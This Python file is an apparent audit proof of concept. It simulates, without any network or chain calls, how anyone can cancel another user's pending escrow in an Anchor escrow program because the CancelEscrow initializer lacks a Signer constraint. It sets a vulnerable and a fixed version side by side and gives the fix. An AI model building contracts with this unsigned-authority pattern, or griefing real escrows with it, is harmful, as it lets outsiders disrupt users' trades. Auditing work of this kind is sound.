"""Exploit PoC: Cancel escrow without initializer signature (anchor-escrow SEM-001).

Demonstrates that anyone can cancel any escrow because the `initializer`
field in CancelEscrow is AccountInfo without the Signer constraint.

Source: coral-xyz/anchor examples/escrow (lib.rs lines 160-176)
Vulnerable struct:
    #[derive(Accounts)]
    pub struct CancelEscrow<'info> {
        /// CHECK:
        pub initializer: AccountInfo<'info>,  // <-- NO Signer
        #[account(mut)]
        pub pda_deposit_token_account: InterfaceAccount<'info, TokenAccount>,
        /// CHECK:
        pub pda_account: AccountInfo<'info>,
        #[account(
            mut,
            constraint = escrow_account.initializer_key == *initializer.key,
            constraint = escrow_account.initializer_deposit_token_account == ...,
            close = initializer
        )]
        pub escrow_account: Account<'info, EscrowAccount>,
        pub token_program: Interface<'info, TokenInterface>,
    }

The constraint only checks that initializer.key matches the stored key,
but since the initializer's pubkey is ON-CHAIN (in escrow_account.initializer_key),
anyone can read it and pass it as the initializer AccountInfo.

Impact: DoS — attacker can cancel any pending escrow, preventing exchanges.
Tokens return to initializer (no fund theft), but trade is griefed.
"""
from dataclasses import dataclass


@dataclass
class EscrowAccount:
    """Simulates the on-chain EscrowAccount."""
    initializer_key: str = ""
    initializer_deposit_token_account: str = ""
    initializer_receive_token_account: str = ""
    initializer_amount: int = 0
    taker_amount: int = 0
    is_closed: bool = False


@dataclass
class TokenAccountState:
    """Simulates an SPL token account."""
    pubkey: str = ""
    authority: str = ""
    amount: int = 0


class TransactionContext:
    """Simulates a Solana transaction context."""
    def __init__(self, signer: str):
        self.signer = signer


PDA_AUTHORITY = "EscrowPDA11111111111111111111"


def initialize_escrow(
    ctx: TransactionContext,
    escrow: EscrowAccount,
    deposit_token: TokenAccountState,
    receive_token: TokenAccountState,
    initializer_amount: int,
    taker_amount: int,
) -> bool:
    """Simulates initialize_escrow: initializer sets up the deal."""
    # Anchor checks: initializer is Signer (in InitializeEscrow struct)
    escrow.initializer_key = ctx.signer
    escrow.initializer_deposit_token_account = deposit_token.pubkey
    escrow.initializer_receive_token_account = receive_token.pubkey
    escrow.initializer_amount = initializer_amount
    escrow.taker_amount = taker_amount

    # Transfer token account authority to PDA
    deposit_token.authority = PDA_AUTHORITY

    print(f"  initialize_escrow() -> OK")
    print(f"    initializer: {ctx.signer}")
    print(f"    offers {initializer_amount} token X for {taker_amount} token Y")
    print(f"    token account authority transferred to PDA")
    return True


def cancel_escrow_vulnerable(
    ctx: TransactionContext,
    initializer_pubkey: str,
    escrow: EscrowAccount,
    deposit_token: TokenAccountState,
) -> bool:
    """Simulates the VULNERABLE cancel_escrow.

    BUG: initializer is AccountInfo without Signer constraint.
    The constraint `escrow_account.initializer_key == *initializer.key`
    only checks key equality — but the key is public and on-chain.
    """
    # Anchor constraint check: initializer_key == initializer.key
    if escrow.initializer_key != initializer_pubkey:
        print(f"  cancel_escrow() -> REJECTED: key mismatch")
        return False

    # No signer check — anyone can provide the initializer's pubkey
    print(f"  cancel_escrow()")
    print(f"    Transaction signer:    {ctx.signer}")
    print(f"    Initializer provided:  {initializer_pubkey}")
    print(f"    Signer == initializer? {ctx.signer == initializer_pubkey}")
    print(f"    Constraint check:      PASSED (key matches on-chain data)")

    # set_authority: PDA returns token account to initializer
    deposit_token.authority = escrow.initializer_key
    print(f"    Token authority returned to: {deposit_token.authority}")

    # close = initializer: rent refund to initializer
    escrow.is_closed = True
    print(f"    Escrow account closed, rent returned to initializer")
    print(f"    Result: OK (no signer check on initializer)")
    return True


def cancel_escrow_fixed(
    ctx: TransactionContext,
    initializer_pubkey: str,
    escrow: EscrowAccount,
    deposit_token: TokenAccountState,
) -> bool:
    """What the CORRECT cancel_escrow should enforce.

    initializer should be Signer<'info>, not AccountInfo<'info>.
    """
    if ctx.signer != initializer_pubkey:
        print(f"  cancel_escrow_fixed() -> REJECTED: {ctx.signer} is not signer for {initializer_pubkey}")
        return False

    if escrow.initializer_key != initializer_pubkey:
        print(f"  cancel_escrow_fixed() -> REJECTED: key mismatch")
        return False

    deposit_token.authority = escrow.initializer_key
    escrow.is_closed = True
    print(f"  cancel_escrow_fixed() -> OK (signer verified)")
    return True


def main():
    print("=" * 60)
    print("EXPLOIT: Cancel Escrow Without Initializer Signature")
    print("=" * 60)

    initializer = "InitializerPubkey1111111111111"
    attacker = "AttackerPubkey222222222222222222"
    taker = "TakerPubkey33333333333333333333"

    escrow = EscrowAccount()
    deposit_token = TokenAccountState(
        pubkey="DepositTokenAcct444444444444444",
        authority=initializer,
        amount=100,
    )
    receive_token = TokenAccountState(
        pubkey="ReceiveTokenAcct555555555555555",
        authority=initializer,
        amount=0,
    )

    # Step 1: Initializer creates escrow (offers 100 X for 50 Y)
    print("\nStep 1: Initializer creates escrow")
    init_ctx = TransactionContext(signer=initializer)
    assert initialize_escrow(init_ctx, escrow, deposit_token, receive_token, 100, 50)

    assert deposit_token.authority == PDA_AUTHORITY, "PDA should control token account"

    # Step 2: Attacker reads initializer pubkey from on-chain escrow data
    print("\nStep 2: Attacker reads escrow account data on-chain")
    leaked_initializer = escrow.initializer_key  # This is public on-chain data
    print(f"  Attacker reads escrow_account.initializer_key = {leaked_initializer}")

    # Step 3: Attacker cancels the escrow (DoS)
    print("\nStep 3: Attacker cancels escrow (not the initializer!)")
    attacker_ctx = TransactionContext(signer=attacker)
    result = cancel_escrow_vulnerable(attacker_ctx, leaked_initializer, escrow, deposit_token)

    assert result, "EXPLOIT: Attacker successfully cancelled escrow"
    assert escrow.is_closed, "Escrow should be closed"
    assert deposit_token.authority == initializer, "Tokens returned to initializer (not stolen)"

    # Step 4: Taker can no longer exchange
    print("\nStep 4: Taker tries to exchange — fails because escrow is closed")
    print(f"  Escrow is_closed: {escrow.is_closed}")
    print(f"  Taker cannot complete the trade — escrow was griefed")

    # Step 5: Verify fixed version rejects attacker
    print("\nStep 5: Fixed version rejects attacker")
    escrow2 = EscrowAccount()
    deposit2 = TokenAccountState(pubkey="dt2", authority=initializer, amount=100)
    receive2 = TokenAccountState(pubkey="rt2", authority=initializer, amount=0)
    initialize_escrow(init_ctx, escrow2, deposit2, receive2, 100, 50)

    result_fixed = cancel_escrow_fixed(attacker_ctx, leaked_initializer, escrow2, deposit2)
    assert not result_fixed, "Fixed version should reject attacker"

    # Step 6: Fixed version accepts initializer
    print("\nStep 6: Fixed version accepts actual initializer")
    result_init = cancel_escrow_fixed(init_ctx, initializer, escrow2, deposit2)
    assert result_init, "Fixed version should accept initializer"

    print("\n" + "=" * 60)
    print("EXPLOIT RESULT:")
    print(f"  Attacker ({attacker[:20]}...) cancelled an escrow")
    print(f"  belonging to ({initializer[:20]}...).")
    print("  ")
    print("  Impact: Denial of Service")
    print("  - Tokens return to initializer (no fund theft)")
    print("  - But the pending exchange is destroyed")
    print("  - Taker can no longer complete the trade")
    print("  - Attacker can grief ANY escrow repeatedly")
    print("  ")
    print("  Root cause: CancelEscrow.initializer is AccountInfo, not Signer")
    print("  The constraint `initializer_key == *initializer.key` only")
    print("  checks key equality, but the key is public on-chain data.")
    print("  ")
    print("  Fix: Change `pub initializer: AccountInfo<'info>` to")
    print("       `pub initializer: Signer<'info>` in CancelEscrow")
    print("\n  >>> EXPLOIT CONFIRMED: Unauthorized escrow cancellation (DoS) <<<")
    print("=" * 60)


if __name__ == "__main__":
    main()
